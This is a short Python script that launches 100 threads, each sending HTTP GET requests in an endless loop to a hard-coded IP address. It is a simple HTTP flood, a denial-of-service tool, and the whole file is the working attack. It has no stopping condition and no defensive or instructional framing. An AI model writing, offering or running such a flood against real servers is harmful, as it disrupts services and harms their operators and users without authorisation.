import requests
import threading


url = 'https://64.234.215.20:80/'  # Make sure the URL includes 'http://' or 'https://'


def send_request():
    while True:
        try:
            response = requests.get(url)
            print(f"Sent request to {url} - Status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error occurred: {e}")


num_threads = 100

# Create and start threads
threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=send_request)
    thread.start()
    threads.append(thread)
for thread in threads:
    thread.join()
